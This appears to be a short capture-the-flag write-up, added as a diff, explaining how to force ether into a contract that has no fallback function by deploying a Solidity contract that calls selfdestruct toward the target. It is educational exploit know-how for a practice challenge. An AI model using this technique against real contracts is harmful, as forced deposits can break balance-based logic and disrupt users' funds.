@@ -1,0 +1,15 @@
+The goal is to send ether to the contract.
+Usually, sending ether to a contract requires a fallback function to be implemented, but one can force-send ether by calling the selfdestruct instruction on a contract containing ether. 
+This instruction bypasses any checks.
+
+A simple selfdestruct contract to solve this challenge looks like this:
+
+pragma solidity ^0.7.3;
+
+contract ForceSend {
+
+    constructor (address payable target) payable {
+        require(msg.value > 0);
+        selfdestruct(target);
+    }
+}
